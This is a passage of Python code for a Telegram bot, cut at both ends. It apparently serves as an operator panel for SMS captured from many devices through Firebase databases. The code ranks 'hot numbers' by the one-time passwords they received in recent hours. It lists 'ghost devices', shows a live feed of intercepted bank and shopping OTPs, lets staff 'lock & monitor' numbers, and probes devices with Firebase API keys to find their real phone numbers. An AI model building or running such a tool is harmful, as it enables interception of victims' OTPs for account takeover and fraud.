@router.callback_query(F.data.startswith("release_num_"))
async def cb_release_num(call: CallbackQuery):
    uid = call.from_user.id
    nid = int(call.data.split("_")[2])
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num: return await call.answer("Not found.", show_alert=True)
    if num["assigned_to"] != uid and uid not in ADMIN_IDS:
        return await call.answer("⛔ Not your number.", show_alert=True)
    with db.cx() as c:
        c.execute("UPDATE numbers SET assigned_to=NULL WHERE id=?", (nid,))
    await call.answer("✅ Released.")
    await call.message.answer(f"🔓 Released <code>{_disp(num['number'])}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔙 Home", callback_data="back_home")]]))


# ══════════════════════════════════════════════════════════════
# GHOST DEVICES
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("ghost_list_"))
async def cb_ghost_list(call: CallbackQuery):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    await call.answer()
    page = int(call.data.split("_")[2]) if len(call.data.split("_")) > 2 else 0

    ghosts = db.cx().execute(
        "SELECT n.*, gq.category FROM numbers n "
        "LEFT JOIN ghost_queue gq ON gq.number_id=n.id "
        "WHERE n.is_ghost=1 OR n.number LIKE 'DEV-%' "
        "ORDER BY gq.category, n.fb_source, n.device_name").fetchall()

    if not ghosts:
        return await call.message.edit_text(
            "╔══════════════════════╗\n"
            "  👻 <b>GHOST DEVICES</b>\n"
            "╚══════════════════════╝\n\n"
            "✅ No ghost devices! All numbers resolved.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🔙 Back", callback_data="back_home")]]))

    # Category counts
    recoverable = sum(1 for g in ghosts if (g.get("category") or "Recoverable") == "Recoverable")
    learning    = sum(1 for g in ghosts if (g.get("category") or "") == "Learning")
    dead        = sum(1 for g in ghosts if (g.get("category") or "") == "Dead")

    total_pages = max(1, (len(ghosts) + PAGE_SIZE - 1) // PAGE_SIZE)
    page        = max(0, min(page, total_pages - 1))
    page_ghosts = ghosts[page * PAGE_SIZE : (page + 1) * PAGE_SIZE]

    cat_icons = {"Recoverable":"🔍","Learning":"🧠","Dead":"💀","Resolved":"✅"}
    text = (f"╔══════════════════════╗\n"
            f"  👻 <b>GHOST DEVICES</b>  ({len(ghosts)})\n"
            f"╚══════════════════════╝\n\n"
            f"🔍 Recoverable: <b>{recoverable}</b>  "
            f"🧠 Learning: <b>{learning}</b>  "
            f"💀 Dead: <b>{dead}</b>\n"
            f"Page {page+1}/{total_pages}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n")

    btns = []
    for g in page_ghosts:
        src_lbl  = (g["fb_source"] or "").split("//")[-1].split(".")[0][:10]
        name_str = g["device_name"] or g["device_id"] or "Unknown"
        cat_icon = cat_icons.get(g.get("category") or "Recoverable","🔍")
        btns.append([InlineKeyboardButton(
            text=f"{cat_icon} {name_str[:18]}  [{src_lbl}]",
            callback_data=f"lookup_status_{g['id']}")])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️ Prev", callback_data=f"ghost_list_{page-1}"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton(text="Next ➡️", callback_data=f"ghost_list_{page+1}"))
    if nav: btns.append(nav)

    action = []
    if call.from_user.id in ADMIN_IDS:
        action.append(InlineKeyboardButton(text="🔍 Rescan All", callback_data="adm_rescan"))
    action.append(InlineKeyboardButton(text="🔙 Back", callback_data="back_home"))
    btns.append(action)

    await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))


# ══════════════════════════════════════════════════════════════
# HOT NUMBERS
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "hot_numbers")
async def cb_hot_numbers(call: CallbackQuery):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    await call.answer()
    # Only show numbers that have ACTUALLY received OTPs in last 6h
    cutoff = (_now_ist() - timedelta(hours=6)).strftime("%d-%m-%Y %H:%M:%S")
    otp_nums = db.cx().execute(
        "SELECT number, COUNT(*) as otp_cnt FROM sms_log "
        "WHERE received_at > ? AND otp IS NOT NULL AND sms_category='OTP' GROUP BY number",
        (cutoff,)).fetchall()
    otp_set = {r["number"] for r in otp_nums}

    # Primary: numbers with OTPs in last 6h, sorted by count
    nums_with_otp = []
    if otp_set:
        ids_placeholders = ",".join("?" * len(otp_set))
        nums_with_otp = db.cx().execute(
            f"SELECT * FROM numbers WHERE is_ghost=0 AND status='Active' "
            f"AND number IN ({ids_placeholders}) ORDER BY hot_score DESC, last_sms_ts DESC LIMIT 20",
            list(otp_set)).fetchall()

    # Admin-approved hot numbers (hot_score >= 80) — always visible regardless of SMS timing
    admin_approved = db.cx().execute(
        "SELECT * FROM numbers WHERE is_ghost=0 AND status='Active' "
        "AND hot_score >= 80 ORDER BY hot_score DESC, last_sms_ts DESC LIMIT 20"
    ).fetchall()
    # Merge: approved numbers that are not already in otp list
    existing_ids = {n["id"] for n in nums_with_otp}
    for n in admin_approved:
        if n["id"] not in existing_ids:
            nums_with_otp.append(n)
            existing_ids.add(n["id"])

    # Fallback: any recently active number (last 24h by last_sms_ts)
    if not nums_with_otp:
        cutoff_ts = int((datetime.now() - timedelta(hours=24)).timestamp())
        nums_with_otp = db.cx().execute(
            "SELECT * FROM numbers WHERE is_ghost=0 AND status='Active' "
            "AND last_sms_ts IS NOT NULL AND last_sms_ts > ? "
            "ORDER BY last_sms_ts DESC LIMIT 20",
            (cutoff_ts,)).fetchall()

    display_nums = nums_with_otp

    if not display_nums:
        return await call.message.answer(
            "╔══════════════════════╗\n"
            "  🔥 <b>HOT NUMBERS</b>\n"
            "╚══════════════════════╝\n\n"
            "<i>No numbers have received SMS in the last 24 hours.\n\n"
            "Tip: Hot scores update every 15 min. If your Firebase is new,\n"
            "wait for the first SMS to arrive and check again.</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🔄 Refresh", callback_data="hot_numbers"),
                InlineKeyboardButton(text="🔙 Back",    callback_data="back_home")]]))

    has_real_otps = bool(nums_with_otp and otp_set and any(n["number"] in otp_set for n in display_nums))
    text  = "╔══════════════════════╗\n  🔥 <b>HOT NUMBERS</b>\n╚══════════════════════╝\n\n"
    if has_real_otps:
        text += f"<i>🎯 Numbers receiving OTPs (last 6h) — {len(display_nums)} found:</i>\n\n"
    else:
        text += f"<i>📡 Recently active numbers (last 24h) — {len(display_nums)} found:\n(No OTPs yet in last 6h)</i>\n\n"

    btns  = []
    for i, n in enumerate(display_nums[:10], 1):
        score      = n.get("hot_score") or 0
        otp_c      = next((r["otp_cnt"] for r in otp_nums if r["number"] == n["number"]), 0)
        fire       = "🔥🔥🔥" if otp_c > 5 else ("🔥🔥" if otp_c > 1 else ("🔥" if otp_c else "📡"))
        carrier    = n.get("carrier") or ""
        net_str    = f" · {carrier}" if carrier and carrier not in ("N/A","") else ""
        last_ts    = n.get("last_sms_ts")
        last_str   = ""
        if last_ts:
            age_m = int((datetime.now().timestamp() - last_ts) / 60)
            last_str = f"  🕐 {age_m}m ago" if age_m < 60 else f"  🕐 {age_m//60}h ago"
        text += (f"{fire} <b>#{i}</b> <code>{n['number']}</code>{net_str}\n"
                 f"   🎯 OTPs: <b>{otp_c}</b>{last_str}\n\n")
        label = f"{fire} #{i} {_disp(n['number'])}"
        if otp_c: label += f" [OTPs:{otp_c}]"
        btns.append([InlineKeyboardButton(text=label, callback_data=f"numdetail_{n['id']}")])

    btns.append([InlineKeyboardButton(text="🔄 Refresh", callback_data="hot_numbers"),
                 InlineKeyboardButton(text="🔙 Back",    callback_data="back_home")])
    await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))


# ══════════════════════════════════════════════════════════════
# 3-TIER NUMBER VIEW  🟢 Hot · 🟡 Standby · 🔴 Offline
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "tiers_menu")
async def cb_tiers_menu(call: CallbackQuery):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    await call.answer()
    now_ts  = int(datetime.now().timestamp())
    hot_cut = now_ts - 7200  # 2 hours

    hot_cnt = db.cx().execute(
        "SELECT COUNT(*) as c FROM numbers "
        "WHERE is_ghost=0 AND status='Active' AND last_sms_ts IS NOT NULL "
        "AND last_sms_ts > ? AND (report_count IS NULL OR report_count < 3)",
        (hot_cut,)).fetchone()["c"]

    standby_cnt = db.cx().execute(
        "SELECT COUNT(*) as c FROM numbers "
        "WHERE is_ghost=0 AND status='Active' "
        "AND (last_sms_ts IS NULL OR last_sms_ts <= ? OR report_count >= 3)",
        (hot_cut,)).fetchone()["c"]

    offline_cnt = db.cx().execute(
        "SELECT COUNT(*) as c FROM numbers "
        "WHERE is_ghost=1 OR status IN ('Inactive','Dead')").fetchone()["c"]

    text = (
        "╔══════════════════════╗\n"
        "  📊 <b>NUMBER TIERS</b>\n"
        "╚══════════════════════╝\n\n"
        "🟢 <b>HOT</b>  — received OTP/SMS in last 2 hours\n"
        "🟡 <b>STANDBY</b>  — active, no recent SMS (or reported)\n"
        "🔴 <b>OFFLINE</b>  — inactive / ghost / dead\n\n"
        "Select a tier to browse numbers:"
    )
    btns = [
        [InlineKeyboardButton(text=f"🟢 Hot  ({hot_cnt})",         callback_data="tier_hot")],
        [InlineKeyboardButton(text=f"🟡 Standby  ({standby_cnt})", callback_data="tier_standby")],
        [InlineKeyboardButton(text=f"🔴 Offline  ({offline_cnt})", callback_data="tier_offline")],
        [InlineKeyboardButton(text="🔄 Refresh", callback_data="tiers_menu"),
         InlineKeyboardButton(text="🔙 Back",    callback_data="back_home")],
    ]
    try:
        await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    except Exception:
        await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))


_HOT_PAGE_SIZE = 15   # numbers per page in Tier 1


async def _show_tier_hot(call: CallbackQuery, page: int = 0):
    """Paginated Hot tier — 15 numbers per page with Prev/Next navigation."""
    now_ts  = int(datetime.now().timestamp())
    hot_cut = now_ts - 7200
    nums = db.cx().execute(
        "SELECT * FROM numbers WHERE is_ghost=0 AND status='Active' "
        "AND last_sms_ts IS NOT NULL AND last_sms_ts > ? "
        "AND (report_count IS NULL OR report_count < 3) "
        "ORDER BY last_sms_ts DESC",
        (hot_cut,)).fetchall()

    if not nums:
        msg = ("╔══════════════════════╗\n  🟢 <b>HOT TIER</b>\n╚══════════════════════╝\n\n"
               "<i>No numbers received SMS in the last 2 hours.</i>")
        kb  = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔄 Refresh", callback_data="tier_hot"),
            InlineKeyboardButton(text="🔙 Tiers",   callback_data="tiers_menu")]])
        try:    await call.message.edit_text(msg, reply_markup=kb)
        except: await call.message.answer(msg, reply_markup=kb)
        return

    total       = len(nums)
    total_pages = max(1, (total + _HOT_PAGE_SIZE - 1) // _HOT_PAGE_SIZE)
    page        = max(0, min(page, total_pages - 1))
    page_nums   = nums[page * _HOT_PAGE_SIZE : (page + 1) * _HOT_PAGE_SIZE]

    text = (f"╔══════════════════════╗\n"
            f"  🟢 <b>HOT TIER</b>  ({total})\n"
            f"╚══════════════════════╝\n\n"
            f"<i>SMS in last 2h — page {page+1}/{total_pages}:</i>\n\n")
    btns = []
    for n in page_nums:
        age_str = _fmt_age(n.get("last_sms_ts"))
        carrier = n.get("carrier") or ""
        net_str = f" · {carrier}" if carrier and carrier not in ("N/A","") else ""
        rpt     = n.get("report_count") or 0
        rpt_str = f" ⚠️{rpt}" if rpt else ""
        text   += f"🟢 <code>{n['number']}</code>{net_str}  🕐 {age_str}{rpt_str}\n"
        label   = f"🟢 {_disp(n['number'])}  {age_str}"
        btns.append([InlineKeyboardButton(text=label, callback_data=f"numdetail_{n['id']}")])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️ Prev", callback_data=f"tier_hot_pg_{page-1}"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton(text="Next ➡️", callback_data=f"tier_hot_pg_{page+1}"))
    if nav: btns.append(nav)
    btns.append([InlineKeyboardButton(text="🔄 Refresh", callback_data="tier_hot"),
                 InlineKeyboardButton(text="🔙 Tiers",   callback_data="tiers_menu")])
    try:    await call.message.edit_text(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    except: await call.message.answer(text[:4000],   reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))


@router.callback_query(F.data == "tier_hot")
async def cb_tier_hot(call: CallbackQuery):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    await call.answer()
    await _show_tier_hot(call, page=0)


@router.callback_query(F.data.startswith("tier_hot_pg_"))
async def cb_tier_hot_page(call: CallbackQuery):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    await call.answer()
    try:    page = int(call.data.split("_")[-1])
    except: page = 0
    await _show_tier_hot(call, page=page)


_STANDBY_PAGE_SIZE = 15  # max rows per standby page before Next button appears


async def _show_tier_standby(call: CallbackQuery, page: int = 0):
    """Paginated Standby tier — 15 numbers per page with Prev/Next navigation.
    Numbers with SMS in last 30-60 min are promoted to Tier 1 automatically
    (last_sms_ts check), so only truly stale numbers appear here.
    """
    now_ts  = int(datetime.now().timestamp())
    hot_cut = now_ts - 7200
    nums = db.cx().execute(
        "SELECT * FROM numbers WHERE is_ghost=0 AND status='Active' "
        "AND (last_sms_ts IS NULL OR last_sms_ts <= ? OR report_count >= 3) "
        "ORDER BY last_sms_ts DESC",
        (hot_cut,)).fetchall()

    # FIX: Highlight any Standby number that received SMS in last 30–60 min —
    # those will appear at the top (ORDER BY last_sms_ts DESC) and show as
    # promotable. They'll move to Tier 1 automatically on next tier refresh.
    if not nums:
        try:
            await call.message.edit_text(
                "🟡 <b>STANDBY TIER</b>\n\n<i>No numbers in standby.</i>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text="🔄 Refresh", callback_data="tier_standby"),
                    InlineKeyboardButton(text="🔙 Tiers",   callback_data="tiers_menu")]]))
        except Exception:
            await call.message.answer(
                "🟡 <b>STANDBY TIER</b>\n\n<i>No numbers in standby.</i>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text="🔄 Refresh", callback_data="tier_standby"),
                    InlineKeyboardButton(text="🔙 Tiers",   callback_data="tiers_menu")]]))
        return

    total       = len(nums)
    total_pages = max(1, (total + _STANDBY_PAGE_SIZE - 1) // _STANDBY_PAGE_SIZE)
    page        = max(0, min(page, total_pages - 1))
    page_nums   = nums[page * _STANDBY_PAGE_SIZE : (page + 1) * _STANDBY_PAGE_SIZE]

    text = (f"╔══════════════════════╗\n"
            f"  🟡 <b>STANDBY TIER</b>  ({total})\n"
            f"╚══════════════════════╝\n\n"
            f"<i>Active, no SMS in 2h — page {page+1}/{total_pages}:</i>\n\n")
    btns = []
    promote_cut = now_ts - 3600  # SMS in last 1h → highlight as "waking up"
    for n in page_nums:
        lts     = n.get("last_sms_ts")
        age_str = _fmt_age(lts) if lts else "never"
        rpt     = n.get("report_count") or 0
        rpt_str = f" ⚠️{rpt}/3" if rpt else ""
        # Show ⚡ icon if SMS in last hour — about to be promoted on next refresh
        wake    = " ⚡" if lts and lts >= promote_cut else ""
        line    = f"🟡 <code>{n['number']}</code>  🕐 {age_str}{rpt_str}{wake}\n"
        text   += line
        label   = f"🟡{wake} {_disp(n['number'])}  {age_str}"
        if rpt >= 3: label += f"  ⚠️{rpt}"
        btns.append([InlineKeyboardButton(text=label, callback_data=f"numdetail_{n['id']}")])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️ Prev", callback_data=f"tier_sb_{page-1}"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton(text="Next ➡️", callback_data=f"tier_sb_{page+1}"))
    if nav: btns.append(nav)
    btns.append([InlineKeyboardButton(text="🔄 Refresh", callback_data="tier_standby"),
                 InlineKeyboardButton(text="🔙 Tiers",   callback_data="tiers_menu")])
    try:
        await call.message.edit_text(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    except Exception:
        await call.message.answer(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))


@router.callback_query(F.data == "tier_standby")
async def cb_tier_standby(call: CallbackQuery):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    await call.answer()
    await _show_tier_standby(call, 0)


@router.callback_query(F.data.startswith("tier_sb_"))
async def cb_tier_standby_page(call: CallbackQuery):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    await call.answer()
    try:
        page = int(call.data.split("_")[2])
    except (IndexError, ValueError):
        page = 0
    await _show_tier_standby(call, page)


@router.callback_query(F.data == "tier_offline")
async def cb_tier_offline(call: CallbackQuery):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    await call.answer()
    nums = db.cx().execute(
        "SELECT * FROM numbers WHERE is_ghost=1 OR status IN ('Inactive','Dead') "
        "ORDER BY last_sms_ts DESC LIMIT 30").fetchall()

    if not nums:
        return await call.message.edit_text(
            "🔴 <b>OFFLINE TIER</b>\n\n<i>No offline numbers.</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🔄 Refresh", callback_data="tier_offline"),
                InlineKeyboardButton(text="🔙 Tiers",   callback_data="tiers_menu")]]))

    text = "╔══════════════════════╗\n  🔴 <b>OFFLINE TIER</b>\n╚══════════════════════╝\n\n"
    text += f"<i>{len(nums)} numbers inactive/ghost/dead:</i>\n\n"
    btns = []
    for i, n in enumerate(nums):
        lts     = n.get("last_sms_ts")
        age_str = _fmt_age(lts) if lts else "never"
        ghost   = " 👻" if n.get("is_ghost") else ""
        line    = f"🔴 <code>{n['number']}</code>  🕐 {age_str}{ghost}\n"
        if len(text) + len(line) > 3700:
            text += f"<i>…and {len(nums) - i} more</i>\n"
            break
        text += line
        label = f"🔴 {_disp(n['number'])}  {age_str}{ghost}"
        btns.append([InlineKeyboardButton(text=label, callback_data=f"numdetail_{n['id']}")])

    btns.append([InlineKeyboardButton(text="🔄 Refresh", callback_data="tier_offline"),
                 InlineKeyboardButton(text="🔙 Tiers",   callback_data="tiers_menu")])
    try:
        await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    except Exception:
        await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))


# ══════════════════════════════════════════════════════════════
# GLOBAL RADAR
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "global_radar")
async def cb_global_radar(call: CallbackQuery):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    await call.answer()
    await _show_radar(call, "All")


@router.callback_query(F.data.startswith("radar_filter_"))
async def cb_radar_filter(call: CallbackQuery):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    filt = call.data.split("radar_filter_")[1]
    await call.answer()
    await _show_radar(call, filt)


async def _show_radar(call: CallbackQuery, filt: str):
    q = "SELECT * FROM sms_log ORDER BY id DESC LIMIT 30"
    if filt != "All":
        rows = db.cx().execute(
            "SELECT * FROM sms_log WHERE sms_category=? ORDER BY id DESC LIMIT 30",
            (filt,)).fetchall()
    else:
        rows = db.cx().execute(q).fetchall()

    cat_icons = {"OTP":"🔑","Bank":"🏦","Amazon":"📦","Flipkart":"🛒",
                 "Swiggy":"🍔","Blinkit":"🟢","Delivery":"🚚","Zomato":"🍕","Other":"💬"}
    text = (f"╔══════════════════════╗\n"
            f"  📡 <b>GLOBAL RADAR</b>  [{filt}]\n"
            f"╚══════════════════════╝\n\n")

    if not rows:
        text += "<i>No SMS data yet.</i>"
    else:
        for r in rows[:15]:
            icon = cat_icons.get(r.get("sms_category","Other"), "💬")
            otp_str = f"  🔑<code>{r['otp']}</code>" if r.get("otp") else ""
            text += (f"{icon} <code>{_disp(r['number'])}</code>{otp_str}\n"
                     f"   📨 {r['sender']}  |  🕐 {r['received_at'][-8:]}\n\n")

    filters = ["All","OTP","Amazon","Flipkart","Swiggy","Bank"]
    filter_btns = [InlineKeyboardButton(
        text=f"{'✅ ' if f==filt else ''}{f}",
        callback_data=f"radar_filter_{f}") for f in filters]
    btns = [filter_btns[:3], filter_btns[3:],
            [InlineKeyboardButton(text="🔄 Refresh", callback_data=f"radar_filter_{filt}"),
             InlineKeyboardButton(text="🔙 Back",    callback_data="back_home")]]
    await call.message.answer(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))


# ══════════════════════════════════════════════════════════════
# DATABASE SELECTOR + PAGINATED LIST
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("num_"))
async def cb_pick_db(call: CallbackQuery):
    if call.data == "num_lookup": return await call.answer()
    await call.answer()
    if not await check_auth(call.from_user.id, call.message): return
    status = call.data.split("_")[1]
    srcs   = db.cx().execute(
        "SELECT * FROM firebase_sources WHERE quarantined=0 ORDER BY label").fetchall()
    btns = []; grand_total = 0
    for src in srcs:
        cnt = db.cx().execute(
            "SELECT COUNT(*) as c FROM numbers WHERE status=? AND fb_source=? AND is_ghost=0",
            (status, src["url"])).fetchone()["c"]
        if cnt == 0: continue
        grand_total += cnt
        stype = src["struct_type"] or "?"
        btns.append([InlineKeyboardButton(
            text=f"📡 {src['label']}  ({cnt})  [{stype}]",
            callback_data=f"srcn_{src['id']}_{status}_0")])
    orphan = db.cx().execute(
        "SELECT COUNT(*) as c FROM numbers WHERE status=? AND fb_source IS NULL AND is_ghost=0",
        (status,)).fetchone()["c"]
    if orphan:
        grand_total += orphan
        btns.append([InlineKeyboardButton(text=f"📱 Manual ({orphan})",
                                          callback_data=f"srcn_0_{status}_0")])
    if not btns:
        return await call.answer(f"No {status} numbers found.", show_alert=True)
    btns.insert(0, [InlineKeyboardButton(
        text=f"🌐 All Databases  ({grand_total})",
        callback_data=f"srcn_all_{status}_0")])
    btns.append([InlineKeyboardButton(text="🔙 Back", callback_data="back_home")])
    await call.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  📂 <b>SELECT DATABASE</b>\n"
        f"╚══════════════════════╝\n\n"
        f"Status: <b>{status}</b> — Choose a source:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data.startswith("srcn_"))
async def cb_show_nums(call: CallbackQuery):
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    parts  = call.data.split("_")
    src_id = parts[1]; status = parts[2]
    page   = int(parts[3]) if len(parts) > 3 else 0

    if src_id == "all":
        nums  = db.cx().execute(
            "SELECT * FROM numbers WHERE status=? AND is_ghost=0", (status,)).fetchall()
        title = "All Databases"
    elif src_id == "0":
        nums  = db.cx().execute(
            "SELECT * FROM numbers WHERE status=? AND fb_source IS NULL AND is_ghost=0",
            (status,)).fetchall()
        title = "Manual Numbers"
    else:
        src   = db.cx().execute("SELECT * FROM firebase_sources WHERE id=?", (src_id,)).fetchone()
        nums  = db.cx().execute(
            "SELECT * FROM numbers WHERE status=? AND fb_source=? AND is_ghost=0",
            (status, src["url"])).fetchall()
        title = src["label"] if src else src_id

    if not nums:
        return await call.answer("No numbers here.", show_alert=True)

    uid         = call.from_user.id
    total_nums  = len(nums)
    total_pages = max(1, (total_nums + PAGE_SIZE - 1) // PAGE_SIZE)
    page        = max(0, min(page, total_pages - 1))
    page_nums   = nums[page * PAGE_SIZE : (page + 1) * PAGE_SIZE]

    btns = []
    for n in page_nums:
        mine    = n["assigned_to"] == uid
        other   = n["assigned_to"] and not mine
        is_dev  = str(n["number"]).startswith("DEV-")
        # 3-tier icon: 🟢 Hot (SMS in 2h), 🟡 Standby (active, no recent SMS), 🔴 Offline
        _now_ts = int(datetime.now().timestamp())
        _lts    = n.get("last_sms_ts") or 0
        _rcount = n.get("report_count") or 0
        if n["status"] != "Active" or n.get("is_ghost"):
            tier_icon = "🔴"
        elif _rcount >= 3:
            tier_icon = "🟡"  # reported dead → standby
        elif _lts and (_now_ts - _lts) <= 7200:
            tier_icon = "🟢"  # hot: SMS in last 2h
        else:
            tier_icon = "🟡"  # standby: active but no recent SMS
        if mine:   tier_icon = "👤"
        if other:  tier_icon = "🔒"
        if is_dev: tier_icon = "🔍"
        hot     = "🔥" if (n.get("hot_score") or 0) > 20 else ""
        disp    = f"Unknown [{n['device_id'][:8]}...]" if is_dev else _disp(n["number"])
        age_str = f"  {_fmt_age(_lts)}" if _lts else ""
        label   = f"{tier_icon}{hot} {disp}{age_str}"
        if n["device_name"]: label += f"  [{str(n['device_name'])[:12]}]"
        if mine: label += " ← YOU"
        # Use numdetail_ to auto-show last 5 messages + notification controls first
        btns.append([InlineKeyboardButton(text=label, callback_data=f"numdetail_{n['id']}")])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️ Prev",
                                        callback_data=f"srcn_{src_id}_{status}_{page-1}"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton(text="Next ➡️",
                                        callback_data=f"srcn_{src_id}_{status}_{page+1}"))
    if nav: btns.append(nav)
    btns.append([InlineKeyboardButton(text="🔙 Back", callback_data=f"num_{status}")])

    await call.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  📱 <b>{title}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"<b>{total_nums}</b> {status} numbers  |  Page <b>{page+1}/{total_pages}</b>\n"
        f"Tap a number to lock & monitor:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data == "back_home")
async def cb_back(call: CallbackQuery):
    a = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE status='Active'").fetchone()["c"]
    t = db.cx().execute("SELECT COUNT(*) as c FROM numbers").fetchone()["c"]
    await call.message.edit_text(_home_text(call.from_user.first_name, a, t),
                                 reply_markup=menu_employee())
    await call.answer()


@router.callback_query(F.data == "back_admin")
async def cb_back_admin(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.message.edit_text("🔧 <b>ADMIN CONTROL CENTER</b>", reply_markup=menu_admin())
    await call.answer()

# ══════════════════════════════════════════════════════════════
# BOT LOCK TOGGLE (Admin only)
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_lock_toggle")
async def cb_adm_lock_toggle(call: CallbackQuery):
    global _bot_locked
    if call.from_user.id not in ADMIN_IDS:
        return await call.answer("⛔ Admin only.", show_alert=True)
    _bot_locked = not _bot_locked
    state_str = "🔒 LOCKED" if _bot_locked else "🔓 UNLOCKED"
    await call.answer(f"Bot is now {state_str}", show_alert=True)
    # Refresh admin panel with updated lock button label
    try:
        await call.message.edit_text(
            f"🔧 <b>ADMIN CONTROL CENTER</b>\n\n"
            f"Bot status: <b>{state_str}</b>\n"
            + ("⚠️ All users are now blocked with maintenance message." if _bot_locked
               else "✅ Bot is open for all users."),
            reply_markup=menu_admin())
    except Exception:
        await call.message.answer(
            f"Bot status: <b>{state_str}</b>",
            reply_markup=menu_admin())




# ══════════════════════════════════════════════════════════════
# MONITORING  (SSE + watchdog + dedup)
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("mon_"))
async def cb_monitor(call: CallbackQuery):
    nid = int(call.data.split("_")[1]); uid = call.from_user.id
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num: return await call.answer("Number not found.", show_alert=True)
    if num["assigned_to"] and num["assigned_to"] != uid:
        return await call.answer("❌ Locked by another user.", show_alert=True)

    with db.cx() as c:
        c.execute("UPDATE numbers SET assigned_to=?, assigned_at=? WHERE id=?",
                  (uid, int(datetime.now().timestamp()), nid))
    active_sessions[uid] = True

    online, battery, health_warn = await dev_health(
        num["device_id"], num["fb_source"], num["status_path"])
    nd      = _disp(num["number"])
    carrier = num["carrier"] or "N/A"
    api_key = _get_fb_apikey(num["fb_source"])

    # Nav buttons (Prev/Refresh/Next style from screenshot)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅ Prev",    callback_data=f"chgnum_{nid}"),
         InlineKeyboardButton(text="🔄 Refresh", callback_data=f"refresh_mon_{nid}"),
         InlineKeyboardButton(text="Next ➡",    callback_data=f"chgnum_{nid}")],
        [InlineKeyboardButton(text="⬅ Back",    callback_data="back_home"),
         InlineKeyboardButton(text="🏠 Home",   callback_data="back_home")],
        [InlineKeyboardButton(text="📥 Last 5 SMS", callback_data=f"last5_{nid}"),
         InlineKeyboardButton(text="🔓 Release",    callback_data=f"relnum_{nid}")],
    ])

    is_dev = str(num["number"]).startswith("DEV-")
    probe_note = "\n\n🔍 <i>Looking up real number…</i>" if is_dev else ""

    def _make_text(display_num, display_carrier, extra=""):
        return (
            f"╔══════════════════════╗\n"
            f"  🟢 <b>MONITORING ACTIVE</b>\n"
            f"╚══════════════════════╝\n\n"
            f"📞 <code>{display_num}</code>\n"
            f"📱 <b>{num['device_name'] or 'Unknown'}</b>  |  📶 {display_carrier}\n\n"
            f"⚡ <i>SSE streaming — instant SMS delivery</i>"
            + (f"\n\n{health_warn}" if health_warn else "")
            + extra
        )

    mmsg = await call.message.edit_text(_make_text(nd, carrier, probe_note), reply_markup=kb)

    if is_dev:
        real_ph, real_ca = await _auto_probe_number(
            num["device_id"], num["fb_source"], api_key)
        if real_ph:
            nd = real_ph; carrier = real_ca or carrier
            with db.cx() as cx:
                cx.execute("UPDATE numbers SET number=?,carrier=? WHERE id=?",
                           (real_ph, real_ca or num["carrier"], nid))
            try:
                await mmsg.edit_text(
                    _make_text(nd, carrier, f"\n\n✅ <b>Found!</b> <code>{real_ph}</code> saved."),
                    reply_markup=kb)
            except: pass
        else:
            try:
                await mmsg.edit_text(
                    _make_text(nd, carrier, "\n\n❌ <b>No number found.</b>"),
                    reply_markup=kb)
